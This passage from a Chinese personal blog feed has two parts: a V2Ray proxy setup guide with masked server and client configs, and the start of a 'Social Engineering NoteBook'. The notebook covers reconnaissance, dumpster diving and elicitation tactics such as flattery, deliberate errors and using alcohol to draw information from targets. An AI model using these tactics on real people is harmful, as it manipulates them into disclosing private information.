class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;inbounds&quot;</span>: [&#123;</span><br><span class="line">    <span class="attr">&quot;port&quot;</span>: *****, <span class="comment">// 服务器端口</span></span><br><span class="line">    <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;vmess&quot;</span>, <span class="comment">// 使用vmess协议</span></span><br><span class="line">    <span class="attr">&quot;settings&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;clients&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;********-****-****-****-************&quot;</span>, <span class="comment">// UUID格式的id，相当于password</span></span><br><span class="line">          <span class="attr">&quot;level&quot;</span>: <span class="number">1</span>,</span><br><span class="line">          <span class="attr">&quot;alterId&quot;</span>: <span class="number">64</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  <span class="attr">&quot;outbounds&quot;</span>: [&#123;</span><br><span class="line">    <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;freedom&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;settings&quot;</span>: &#123;&#125;</span><br><span class="line">  &#125;,&#123;</span><br><span class="line">    <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;blackhole&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;settings&quot;</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">&quot;tag&quot;</span>: <span class="string">&quot;blocked&quot;</span></span><br><span class="line">  &#125;],</span><br><span class="line">  <span class="attr">&quot;routing&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;rules&quot;</span>: [</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;field&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;ip&quot;</span>: [<span class="string">&quot;geoip:private&quot;</span>],</span><br><span class="line">        <span class="attr">&quot;outboundTag&quot;</span>: <span class="string">&quot;blocked&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改好合适的端口后，使用如下命令启动V2Ray服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start v2ray</span><br></pre></td></tr></table></figure><h2 id="Client-Windows-1"><a href="#Client-Windows-1" class="headerlink" title="Client(Windows)"></a>Client(Windows)</h2><p>修改解压出来的目录下的config.json</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Config file of V2Ray. This file follows standard JSON format, with comments support.</span></span><br><span class="line"><span class="comment">// Uncomment entries below to satisfy your needs. Also read our manual for more detail at</span></span><br><span class="line"><span class="comment">// https://www.v2ray.com/</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;log&quot;</span>: &#123;</span><br><span class="line">    <span class="comment">// By default, V2Ray writes access log to stdout.</span></span><br><span class="line">    <span class="comment">// &quot;access&quot;: &quot;/path/to/access/log/file&quot;,</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// By default, V2Ray write error log to stdout.</span></span><br><span class="line">    <span class="comment">// &quot;error&quot;: &quot;/path/to/error/log/file&quot;,</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Log level, one of &quot;debug&quot;, &quot;info&quot;, &quot;warning&quot;, &quot;error&quot;, &quot;none&quot;</span></span><br><span class="line">    <span class="attr">&quot;loglevel&quot;</span>: <span class="string">&quot;warning&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;access&quot;</span>: <span class="string">&quot;.\\access.log&quot;</span>, <span class="comment">// 设置access日志的位置</span></span><br><span class="line">    <span class="attr">&quot;error&quot;</span>: <span class="string">&quot;.\\error.log&quot;</span> <span class="comment">// 设置error日志的位置</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// List of inbound proxy configurations.</span></span><br><span class="line">  <span class="attr">&quot;inbounds&quot;</span>: [&#123;</span><br><span class="line">    <span class="comment">// Port to listen on. You may need root access if the value is less than 1024.</span></span><br><span class="line">    <span class="attr">&quot;port&quot;</span>: <span class="number">1080</span>, <span class="comment">// 设置本地端口</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// IP address to listen on. Change to &quot;0.0.0.0&quot; to listen on all network interfaces.</span></span><br><span class="line">    <span class="attr">&quot;listen&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>, <span class="comment">// 本地监听地址</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Tag of the inbound proxy. May be used for routing.</span></span><br><span class="line">    <span class="attr">&quot;tag&quot;</span>: <span class="string">&quot;socks-inbound&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Protocol name of inbound proxy.</span></span><br><span class="line">    <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;socks&quot;</span>, <span class="comment">// 本地使用Socks 5协议</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Settings of the protocol. Varies based on protocol.</span></span><br><span class="line">    <span class="attr">&quot;settings&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;auth&quot;</span>: <span class="string">&quot;noauth&quot;</span>, <span class="comment">// 不需要认证</span></span><br><span class="line">      <span class="attr">&quot;udp&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;ip&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Enable sniffing on TCP connection.</span></span><br><span class="line">    <span class="attr">&quot;sniffing&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;enabled&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">      <span class="comment">// Target domain will be overriden to the one carried by the connection, if the connection is HTTP or HTTPS.</span></span><br><span class="line">      <span class="attr">&quot;destOverride&quot;</span>: [<span class="string">&quot;http&quot;</span>, <span class="string">&quot;tls&quot;</span>]</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;],</span><br><span class="line">  <span class="comment">// List of outbound proxy configurations.</span></span><br><span class="line">  <span class="attr">&quot;outbounds&quot;</span>: [&#123;</span><br><span class="line">    <span class="comment">// Protocol name of the outbound proxy.</span></span><br><span class="line">    <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;vmess&quot;</span>, <span class="comment">// 使用Vmess协议</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Settings of the protocol. Varies based on protocol.</span></span><br><span class="line">    <span class="attr">&quot;settings&quot;</span>: &#123;</span><br><span class="line"><span class="comment">// ************************添加下面的代码*******************</span></span><br><span class="line">    <span class="attr">&quot;vnext&quot;</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">&quot;address&quot;</span>: <span class="string">&quot;***.***.***.***&quot;</span>, <span class="comment">// VPS地址</span></span><br><span class="line">            <span class="attr">&quot;port&quot;</span>: *****, <span class="comment">// VPS监听端口</span></span><br><span class="line">            <span class="attr">&quot;users&quot;</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="attr">&quot;id&quot;</span>: <span class="string">&quot;********-****-****-****-************&quot;</span>, <span class="comment">// UUID格式的ID，同服务器配置的一致</span></span><br><span class="line">                <span class="attr">&quot;alterId&quot;</span>: <span class="number">64</span> <span class="comment">// 同服务器配置的一致</span></span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line"><span class="comment">// ****************************添加上面的代码*******************</span></span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Tag of the outbound. May be used for routing.</span></span><br><span class="line">    <span class="attr">&quot;tag&quot;</span>: <span class="string">&quot;direct&quot;</span></span><br><span class="line">  &#125;,&#123;</span><br><span class="line">    <span class="attr">&quot;protocol&quot;</span>: <span class="string">&quot;blackhole&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;settings&quot;</span>: &#123;&#125;,</span><br><span class="line">    <span class="attr">&quot;tag&quot;</span>: <span class="string">&quot;blocked&quot;</span></span><br><span class="line">  &#125;],</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Transport is for global transport settings. If you have multiple transports with same settings</span></span><br><span class="line">  <span class="comment">// (say mKCP), you may put it here, instead of in each individual inbound/outbounds.</span></span><br><span class="line">  <span class="comment">//&quot;transport&quot;: &#123;&#125;,</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Routing controls how traffic from inbounds are sent to outbounds.</span></span><br><span class="line">  <span class="attr">&quot;routing&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;domainStrategy&quot;</span>: <span class="string">&quot;IPOnDemand&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;rules&quot;</span>:[</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// Blocks access to private IPs. Remove this if you want to access your router.</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;field&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;ip&quot;</span>: [<span class="string">&quot;geoip:private&quot;</span>],</span><br><span class="line">        <span class="attr">&quot;outboundTag&quot;</span>: <span class="string">&quot;blocked&quot;</span></span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// Blocks major ads.</span></span><br><span class="line">        <span class="attr">&quot;type&quot;</span>: <span class="string">&quot;field&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;domain&quot;</span>: [<span class="string">&quot;geosite:category-ads&quot;</span>],</span><br><span class="line">        <span class="attr">&quot;outboundTag&quot;</span>: <span class="string">&quot;blocked&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Dns settings for domain resolution.</span></span><br><span class="line">  <span class="attr">&quot;dns&quot;</span>: &#123;</span><br><span class="line">    <span class="comment">// Static hosts, similar to hosts file.</span></span><br><span class="line">    <span class="attr">&quot;hosts&quot;</span>: &#123;</span><br><span class="line">      <span class="comment">// Match v2ray.com to another domain on CloudFlare. This domain will be used when querying IPs for v2ray.com.</span></span><br><span class="line">      <span class="attr">&quot;domain:v2ray.com&quot;</span>: <span class="string">&quot;www.vicemc.net&quot;</span>,</span><br><span class="line"></span><br><span class="line">      <span class="comment">// The following settings help to eliminate DNS poisoning in mainland China.</span></span><br><span class="line">      <span class="comment">// It is safe to comment these out if this is not the case for you.</span></span><br><span class="line">      <span class="attr">&quot;domain:github.io&quot;</span>: <span class="string">&quot;pages.github.com&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;domain:wikipedia.org&quot;</span>: <span class="string">&quot;www.wikimedia.org&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;domain:shadowsocks.org&quot;</span>: <span class="string">&quot;electronicsrealm.com&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;servers&quot;</span>: [</span><br><span class="line">      <span class="string">&quot;1.1.1.1&quot;</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">&quot;address&quot;</span>: <span class="string">&quot;114.114.114.114&quot;</span>,</span><br><span class="line">        <span class="attr">&quot;port&quot;</span>: <span class="number">53</span>,</span><br><span class="line">        <span class="comment">// List of domains that use this DNS first.</span></span><br><span class="line">        <span class="attr">&quot;domains&quot;</span>: [</span><br><span class="line">          <span class="string">&quot;geosite:cn&quot;</span></span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;8.8.8.8&quot;</span>,</span><br><span class="line">      <span class="string">&quot;localhost&quot;</span></span><br><span class="line">    ]</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Policy controls some internal behavior of how V2Ray handles connections.</span></span><br><span class="line">  <span class="comment">// It may be on connection level by user levels in &#x27;levels&#x27;, or global settings in &#x27;system.&#x27;</span></span><br><span class="line">  <span class="attr">&quot;policy&quot;</span>: &#123;</span><br><span class="line">    <span class="comment">// Connection policys by user levels</span></span><br><span class="line">    <span class="attr">&quot;levels&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;0&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">&quot;uplinkOnly&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="attr">&quot;downlinkOnly&quot;</span>: <span class="number">0</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">&quot;system&quot;</span>: &#123;</span><br><span class="line">      <span class="attr">&quot;statsInboundUplink&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;statsInboundDownlink&quot;</span>: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Stats enables internal stats counter.</span></span><br><span class="line">  <span class="comment">// This setting can be used together with Policy and Api. </span></span><br><span class="line">  <span class="comment">//&quot;stats&quot;:&#123;&#125;,</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// Api enables gRPC APIs for external programs to communicate with V2Ray instance.</span></span><br><span class="line">  <span class="comment">//&quot;api&quot;: &#123;</span></span><br><span class="line">    <span class="comment">//&quot;tag&quot;: &quot;api&quot;,</span></span><br><span class="line">    <span class="comment">//&quot;services&quot;: [</span></span><br><span class="line">    <span class="comment">//  &quot;HandlerService&quot;,</span></span><br><span class="line">    <span class="comment">//  &quot;LoggerService&quot;,</span></span><br><span class="line">    <span class="comment">//  &quot;StatsService&quot;</span></span><br><span class="line">    <span class="comment">//]</span></span><br><span class="line">  <span class="comment">//&#125;,</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// You may add other entries to the configuration, but they will not be recognized by V2Ray.</span></span><br><span class="line">  <span class="attr">&quot;other&quot;</span>: &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行v2ray.exe或者wv2ray.exe即可启动V2Ray</p><ul><li>v2ray.exe: 会打开一个命令行界面运行V2Ray</li><li>wv2ray.exe: 后台运行V2Ray</li></ul><p>Win+R打开运行<br>输入shell:startup运行<br>打开Windows启动目录<br>将wv2ray.exe的<strong>快捷方式</strong>放到该目录下即可开机后台自启动V2Ray</p><p>其余的就和shadowsocks的配置是一样的了，V2Ray在本地监听1080端口，使用SOCK5协议</p><hr><p>关于V2Ray详细的配置请参考<a href="https://toutyrater.github.io/">https://toutyrater.github.io/</a></p><h1 id="IOS"><a href="#IOS" class="headerlink" title="IOS"></a>IOS</h1><p>直接使用Shadowrocket就可以<br>修改类型为Vmess协议<br>填写对应的ip，端口和uuid</p><h1 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h1><p>下载安装<a href="https://github.com/2dust/v2rayNG/releases">v2rayNG</a><br>选择手动输入Vmess<br>填写对应的ip，端口，uuid和alterId</p>]]></content>
    
    
    <summary type="html">可能由于最近马上就要到了祖国的生日了吧，再加上香港动乱，混乱的政治因素，总之出于各种奇怪的原因，墙是越来越高了。由于鄙人还在使用古老的shadowsocks技术，在Vultr买的VPS，买一台封一台，现在也不封端口了，直接失联了，ping都ping不通，想去外面看一看实在是麻烦，所以决定改换用V2Ray科学上网。</summary>
    
    
    
    <category term="Hack" scheme="https://srpopty.github.io/categories/Hack/"/>
    
    
    <category term="Trick" scheme="https://srpopty.github.io/tags/Trick/"/>
    
  </entry>
  
  <entry>
    <title>Social Engineering NoteBook</title>
    <link href="https://srpopty.github.io/2019/08/10/Social-Engineering-NoteBook/"/>
    <id>https://srpopty.github.io/2019/08/10/Social-Engineering-NoteBook/</id>
    <published>2019-08-10T08:06:37.000Z</published>
    <updated>2020-08-11T08:56:19.165Z</updated>
    
    <content type="html"><![CDATA[<p>Social Engineering NoteBook<br>Remember:<br>    Do not trust anyone.<br>    Never let them know what you are thinking.<br>    Keep slience forever.<br>                                    -Srpopty</p><hr><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Google-Hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking</h2><p><a href="https://www.google.com/">Google</a><br>使用GoogleHacking进行被动的信息收集是最安全可靠的，但是收集的信息量有限，有时候需要根据经验以及推理进一步收集信息</p><ol><li><p>原则</p><ul><li>每次查询使用多关键词而不是句子<br>  例如”电脑 蓝屏 解决”的查询结果要比”电脑为什么蓝屏打不开”更好</li><li>尽量使用和查询有关的专有关键词以缩小范围<br>  例如”电脑 蓝屏”的查询结果要比”电脑 打不开”更加精确</li><li>查询尽量简洁，避免冗余关键词以增加不必要的查询结果</li><li>查询的拼写不一定准确(Google有自动纠错功能)</li></ul></li><li><p>技巧</p><ul><li>Google查询关键词的默认连接为”and”</li><li>Google会直接返回关键词匹配的结果而不会扩展关键词的意义(Google的简洁性)</li><li>Google在查询英文时会返回关键词的多种时态</li><li>Google会忽略终结符<br>  例如中文的”的”，”是”，”了”等虚词，英文的”is”，”to”等</li><li>Google每次查询的最大长度为32(超出部分截断)</li><li>两个关键词越近，优先级越高</li><li>关键词越靠前，优先级越高</li><li>Google大小写不敏感</li><li>Google会忽略部分标点符号，不会忽略单引号(‘)</li><li>Google会包含有或没有连字符(-)的结果<br>  例如查询”Mr-Li”，Google会返回”Mr-Li”和”Mr Li”的结果</li></ul></li><li><p>查询操作符</p></li></ol><table><thead><tr><th>操作符表示</th><th>操作符含义</th></tr></thead><tbody><tr><td>term1 term2或term1 and term2</td><td>同时查询包含term1和term2的结果</td></tr><tr><td>term1 | term2或term1 or term2</td><td>查询包含term1或包含term2的结果</td></tr><tr><td>“term”</td><td>强制查询结果中包含term</td></tr><tr><td>-term</td><td>强制查询结果中不包含term</td></tr><tr><td>~term</td><td>查询term或者term的同义词</td></tr><tr><td>number1..number2</td><td>数字范围</td></tr><tr><td>term1 * term2</td><td>代替任意长度字符</td></tr></tbody></table><ol start="4"><li>高级搜索符<blockquote><p>粗体为常用搜索符</p></blockquote></li></ol><table><thead><tr><th>搜索符表示</th><th>搜索符含义</th></tr></thead><tbody><tr><td>allinanchor:</td><td>后面所有的关键词都位于网页的超链接中</td></tr><tr><td>allintext:</td><td>后面所有的关键词都位于网页的文本中</td></tr><tr><td>allintitle:</td><td>后面所有的关键词度位于网页的标题中</td></tr><tr><td>allinurl:</td><td>后面所有的关键词都位于网页的url中</td></tr><tr><td>inanchor:</td><td>关键词位于网页的超链接中</td></tr><tr><td><strong>intext:</strong></td><td>关键词位于网页的文本中</td></tr><tr><td><strong>intitle:</strong></td><td>关键词位于网页的标题中</td></tr><tr><td><strong>inurl:</strong></td><td>关键词位于网页的url中</td></tr><tr><td><strong>cache:</strong></td><td>跳转到关键词url的网页缓存</td></tr><tr><td>define:</td><td>关键词的定义</td></tr><tr><td><strong>ext/filetype:</strong></td><td>文件类型为关键词的文件</td></tr><tr><td>movie:</td><td>关键词相关的电影</td></tr><tr><td>book:</td><td>关键词相关的书籍</td></tr><tr><td><strong>site:</strong></td><td>限定在关键词url的网站中搜索</td></tr><tr><td>related:</td><td>和关键词相关的网页</td></tr></tbody></table><hr><h2 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h2><p><a href="https://www.shodan.com/">Shodan</a><br>检索服务器信息以及开放的端口</p><hr><h2 id="Whois"><a href="#Whois" class="headerlink" title="Whois"></a>Whois</h2><p><a href="https://www.whois.net/">Whois</a><br>Whois可以查询域名以及域名所有人的信息</p><hr><h2 id="WayBack-Machine"><a href="#WayBack-Machine" class="headerlink" title="WayBack Machine"></a>WayBack Machine</h2><p><a href="https://archive.org/web/">WayBack Machine</a><br>可以查询网站的历史归档，比GoogleCache更加久远</p><hr><h2 id="公共服务器"><a href="#公共服务器" class="headerlink" title="公共服务器"></a>公共服务器</h2><p>IP/域名/端口扫描</p><hr><h2 id="个人网站-博客"><a href="#个人网站-博客" class="headerlink" title="个人网站/博客"></a>个人网站/博客</h2><p>很多人都喜欢建立自己的个人网站或博客，将自己的信息展示给所有可以访问的人</p><hr><h2 id="公开报告"><a href="#公开报告" class="headerlink" title="公开报告"></a>公开报告</h2><p>结合GoogleHacking搜索目标企业或机构的公开报告</p><hr><h2 id="社交平台"><a href="#社交平台" class="headerlink" title="社交平台"></a>社交平台</h2><ul><li><a href="https://twitter.com/">Twitter</a>/<a href="https://facebook.com/">FaceBook</a>/<a href="https://blippi.com/">Blippy</a>/<a href="https://www.linkedin.com/">LinkedIn</a>/<a href="https://myspace.com/">MySpace</a>/<a href="http://pleaserobme.com/">PleaseRobMe</a>/<a href="http://icanstalku.com/">ICanStalkU</a>/<a href="https://www.youtube.com/">YouTuBe</a>/<a href="https://www.wikipedia.org/">WikiPedia</a>…</li><li>QQ/微信/新浪微博/百度贴吧/QQ空间…</li></ul><hr><h2 id="观察"><a href="#观察" class="headerlink" title="观察"></a>观察</h2><p>使用望远镜/监控/窃听等辅助设备远程观察</p><hr><h2 id="垃圾收集"><a href="#垃圾收集" class="headerlink" title="垃圾收集"></a>垃圾收集</h2><p>很多垃圾桶里也藏着宝贝，不要放过任何一张写着字纸与存储设备！<br>在一些大公司的垃圾桶里经常有没有完全被碎纸机销毁的重要档案，以及员工丢弃的U盘/移动硬盘等存储设备，经过数据恢复后可以获取重要信息。</p><hr><h2 id="交流"><a href="#交流" class="headerlink" title="交流"></a>交流</h2><p>所有人的身体和精神都存在着一个私密空间，通常这个私密空间里藏着很多重要的信息，交流就是试图闯入这个私密空间获取信息的过程。</p><ul><li><p>基本规则</p><ol><li>不要理所当然的认为目标与你的情况完全一样</li><li>不要理所当然的认为目标会按照你的方式接受与解释信息</li><li>交流不是一个绝对的，一成不变的过程</li><li>如果有多人参与交流，应始终假设每个参与者的情况各不相同</li></ol></li><li><p>香农-韦佛交流模型(鼻祖模型)<br><img src="/2019/08/10/Social-Engineering-NoteBook/0e02817f703d1e72ee30f68ecd10ab95.png"></p><ul><li><p>信息源: 创造信息</p></li><li><p>发送方: 将信息编码为信号</p></li><li><p>信道: 传输信号</p></li><li><p>接收方: 从信号中解码信息</p></li><li><p>目的地: 信息的重点</p><p>问题</p></li></ul><ol><li>技术问题: 信息发送的准确性</li><li>语义问题: 信息表达的准确性</li><li>效率问题: 接收到的信息对行为影响的有效性</li></ol></li><li><p>贝罗模型(SMCR发送者-信息-信道-接收者通信模型)</p><ul><li><p>S-信息源: 常规技巧/态度/知识/社交系统/文化</p></li><li><p>M-信息: 内容/元素/处理/结构/编码</p></li><li><p>C-信道: 看/听/触/闻/尝</p></li><li><p>R-接收方: 常规技巧/态度/知识/社交系统/文化</p><p>符号和标识的形式属性<br>符号/表情及其使用者之间的关系<br>符号和标识之间的联系及其含义</p></li></ul></li><li><p>通信的事物模型<br><img src="/2019/08/10/Social-Engineering-NoteBook/c049d4f97b7f00533569d804b393b65a.png"></p></li><li><p>制定交流模型</p><ul><li>信息源: 社会工程师</li><li>信道: 传达方式(语言/非语言)</li><li>信息: 向接收者传达的内容(命令)</li><li>接收者: 目标</li><li>反馈: 当有效地将信息传达出去后，希望目标给予的回应(预期结果)</li></ul></li></ul><h1 id="诱导"><a href="#诱导" class="headerlink" title="诱导"></a>诱导</h1><p>诱导是一种引发或诱发某种特定行为的刺激</p><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><ol><li>大部分人希望看上去比较有礼貌，尤其是对陌生人</li><li>专业人士希望自己看起来见多识广</li><li>如果得到赞赏，大部分人通常会更加乐意分享信息(多巴胺)</li><li>大部分人不会为了撒谎而撒谎</li><li>大部分人对貌似关心自己的人会比较友善</li></ol><hr><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><ol><li>表现得自然，不要紧张</li><li>拥有足够的知识背景(不能伪装成自己不可能成为的人)</li><li>切忌<strong>贪婪</strong></li></ol><hr><h2 id="铺垫"><a href="#铺垫" class="headerlink" title="铺垫"></a>铺垫</h2><p>以一种<strong>隐晦或婉转</strong>的方式植入想法或思路</p><hr><h2 id="要点"><a href="#要点" class="headerlink" title="要点"></a>要点</h2><ol><li>不惧与他人交谈，并处于非常规的场景中</li><li>真正关心他人，即使是陌生人，乐于分享和倾听</li><li>只在有了真正的解决方案时才提供建议或帮助</li><li>在他人说出自己的问题时，不做主观判断</li></ol><hr><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><ul><li>唤醒他人的自我<br>  精心地吹捧会促使目标说出一些重要的信息</li><li>表达共同的主题<br>  一种迅速拓展关系的手段，会使目标同意进一步地接触，构建信任与和谐的关系</li><li>故意说错<br>  大部分人在听到错误的表达后会有矫正的欲望，似乎他们的正确性受到了挑战，以告诉他人显示自己的学识渊博，不能容忍错误表达</li><li>主动提供信息<br>  利用”责任感”，在交流中主动提供信息会促使目标提供同样价值的信息，人们喜欢分享类似的信息</li><li>假装高深<br>  展示一些信息，假装知道一些内情，使用诱导继续展开话题</li><li>利用酒精地影响(第三方手段)<br>  酒后吐真言</li></ul><hr><h2 id="提问的技术"><a href="#提问的技术" class="headerlink" title="提问的技术"></a>提问的技术</h2><ul><li><p>开放式问题<br>  目标的不仅仅用”是”或”不是”可以回答的问题<br>  例如”为什么”/“怎样”<br>  若目标很抵触开放式问题，可以使用<strong>金字塔方法</strong>，从范围窄的问题开始询问，一步一步拓宽问题</p></li><li><p>封闭式问题<br>  限制目标回答的范围(有穷)<br>  通常不是为了得到详细的信息，而是对话题进行引导</p></li><li><p>引导式问题<br>  具有答案暗示的开放性问题<br>  引导目标，为其提供表达自己观点的机会，但是限制其发挥范围<br>  